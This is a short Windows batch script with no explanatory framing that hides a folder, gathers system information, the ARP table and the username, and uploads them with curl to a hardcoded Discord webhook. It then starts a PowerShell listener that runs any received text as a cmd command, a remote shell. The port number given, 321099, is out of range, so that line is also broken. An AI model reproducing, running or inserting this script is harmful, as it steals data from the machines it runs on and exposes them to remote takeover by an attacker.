cd %~dp0
mkdir bb
attrib +s +h +x bb
cd bb
systeminfo > systeminfo.txt
arp -a > arp.txt
for /f "delims=" %b in ('whoami') do set name=%b
curl -F "file=@systeminfo.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
curl -F "file=@arp.txt" -F "content=%name%" "https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7"
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',321099);$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();$bytes = New-Object System.Byte[] 1024;$encoding = [System.Text.Encoding]::ASCII;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = $encoding.GetString($bytes, 0, $i);$sendback = (cmd /c "$data" 2>&1 | Out-String );$sendbackBytes = $encoding.GetBytes($sendback);$stream.Write($sendbackBytes, 0, $sendbackBytes.Length);$stream.Flush()};$client.Close();$listener.Stop()"
